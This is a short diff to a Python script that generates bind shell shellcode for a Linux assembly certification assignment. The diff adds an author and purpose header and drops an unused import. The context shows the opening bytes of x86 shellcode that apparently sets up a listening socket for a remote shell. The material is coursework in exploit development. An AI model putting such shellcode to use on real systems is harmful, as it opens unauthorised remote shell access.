@@ -1,6 +1,11 @@
 #!/usr/bin/python3
+'''
+Filename:   create_bindshell_shellcode.py  
+Author:     aus-mate
+Purpose:    This code was written for assignment #1 of the SecurityTube Linux Assembly Expert certification.
+Student ID: SLAE-1555
+'''
 import argparse
-import binascii
 
 shellcode = (b"\x31\xc0\x66\xb8\x67\x01\x31\xdb\xb3\x02\x31\xc9\xb1\x01\x31"
              b"\xd2\xcd\x80\x89\xc3\x66\xb8\x69\x01\x52\x66\x68\x11\x67\x66"
